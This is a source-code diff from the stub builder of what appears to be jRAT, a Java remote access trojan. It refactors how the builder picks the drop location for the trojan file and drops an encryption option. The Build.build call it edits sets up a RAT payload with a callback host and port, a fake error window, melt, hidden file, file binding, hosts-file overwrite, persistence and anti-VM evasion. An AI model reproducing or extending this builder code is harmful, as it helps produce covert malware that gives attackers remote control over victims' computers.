@@ -40,6 +40,7 @@ import se.jrat.client.net.PortListener;
 import se.jrat.client.settings.Settings;
 import se.jrat.client.ui.components.PortListenerJComboBox;
 import se.jrat.client.utils.NetUtils;
+import se.jrat.common.DropLocations;
 
 import com.redpois0n.oslib.OperatingSystem;
 
@@ -101,7 +102,7 @@ public class FrameBuildMinimal extends BaseFrame {
 		chckbxEmbed = new JCheckBox("Embed using installer");
 
 		cbLocation = new JComboBox<String>();
-		cbLocation.setModel(new DefaultComboBoxModel<String>(new String[] { "appdata", "root/C drive", "temp/documents (UNIX)", "desktop" }));
+		cbLocation.setModel(new DefaultComboBoxModel<String>(DropLocations.STRINGS));
 
 		JLabel lblKeyfile = new JLabel("Key/File:");
 
@@ -284,8 +285,7 @@ public class FrameBuildMinimal extends BaseFrame {
 				String[] address = new String[] { txtHost.getText().trim() + ":" + spPort.getValue().toString() };
 				String id = txtId.getText().trim();
 				String pass = txtPass.getText().trim();
-				boolean crypt = chckbxEmbed.isSelected();
-				String droppath = cbLocation.getSelectedItem().toString();
+				int droppath = cbLocation.getSelectedIndex();
 				int reconSec = 10;
 				String name = txtFile.getText().trim();
 				boolean fakewindow = false;
@@ -298,7 +298,7 @@ public class FrameBuildMinimal extends BaseFrame {
 				boolean hiddenFile = false;
 				String bindpath = null;
 				String bindname = null;
-				String droptarget = null;
+				int droptarget = -1;
 				boolean usemutex = false;
 				int mutexport = -1;
 				PluginList pluginlist = null;
@@ -324,12 +324,11 @@ public class FrameBuildMinimal extends BaseFrame {
 				osconfig.addOS(OperatingSystem.LINUX);
 				boolean antivm = false;
 
-				Build.build(l, Globals.getStub(), file, address, id, pass, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, droptarget, usemutex, mutexport, pluginlist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, null, antivm);
+				Build.build(l, Globals.getStub(), file, address, id, pass, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, droptarget, usemutex, mutexport, pluginlist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, null, antivm);
 
 				Settings.getGlobal().setVal("baddresses", address);
 				Settings.getGlobal().setVal("bid", id);
 				Settings.getGlobal().setVal("bpass", pass);
-				Settings.getGlobal().setVal("bcrypt", crypt);
 				Settings.getGlobal().setVal("brecat", reconSec);
 			}
 		}.start();
